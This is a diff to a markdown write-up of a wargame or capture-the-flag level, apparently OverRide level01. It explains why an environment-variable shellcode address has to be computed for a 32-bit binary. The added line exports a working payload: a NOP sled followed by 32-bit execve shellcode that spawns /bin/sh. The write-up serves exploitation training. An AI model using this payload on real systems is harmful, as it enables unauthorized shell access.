@@ -122,6 +122,7 @@ level01 is compiled as a 32bit ELF file, in a 64bit machine. That's why we had 3
 Now that we know that, why our shellcode in env didn't work ? The code is still in 32bit so the shellcode should still be correct and adapted for this binary ? Well the problem does not come from the shellcode but its address. We wrote a little c file that has to print a 32bit address in little endian format of a specific env variable (accessible at [./Resources/env_address.c](https://github.com/kbarbry/OverRide/blob/main/level01/Resources/env_address.c)) but by compiling this code, we compile it as a 64bit file since it is the machine configuration. In order to print the address where this env variable would be in the context of a 32bit environment, we can compile our env_address code like this:
 
 ```sh
+level01@OverRide:/tmp$ export SHELLCODE=$(python -c "print('\x90' * 500 + '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80')")
 level01@OverRide:/tmp$ gcc -m32 -o env env_address.c 
 [...]
 level01@OverRide:/tmp$ ./env SHELLCODE
